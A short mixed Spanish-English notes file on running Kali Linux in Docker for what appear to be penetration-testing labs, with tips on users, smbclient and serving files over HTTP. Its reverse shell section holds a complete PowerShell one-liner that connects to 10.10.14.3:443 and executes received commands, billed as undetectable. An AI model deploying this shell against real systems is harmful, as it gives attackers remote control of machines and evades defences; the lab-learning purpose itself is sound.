# kali_docker
Manual para usar kali con docker en una maquina con servidor x11
```console
~$ docker run -it --cap-add NET_ADMIN  --privileged --net=host --env="DISPLAY" --volume="$XAUTHORITY:/root/.Xauthority:rw" -v $(pwd):/home kalilinux/kali-rolling
```
## Agregar un usuario no root
Dentro del contendor de kali
```console
~#adduser username
```
Y agregarlo a grupo sudo
```console
~# usermod -aG sudo username
``` 
Para tener una consola bonita usar el comando `su` con el argumento `-s /bin/bash`
```console
~# su -s /bin/bash username
```
Otra opción es modificar el archivo `etc/passwd` y modificar el shell por defecto del usuario 
```
username:x:1000:1000::/home/rodrigo:/bin/bash
```

## Uso de SMB Client

```console
smbclient  -N \\\\10.10.10.27\\carpeta -U rodrigo 
```
Once logged you can use `ls` command to list de diretories and `get` to copy a file to your local machine.

## Reverse Shell
In this link there is a ReverseShell CheatSheet

[Reverse Shell cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)


This is an example of a windows shell script that it's not detectable as malicious 
```shell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## cat - type
`type` is the windows equivalent linux `cat` command

## Quikly mount http server
Use the command
```console
python3 -m http.server 80
```
It will mount an http server listening on the port 80, and it  will serve any file in the current working directory
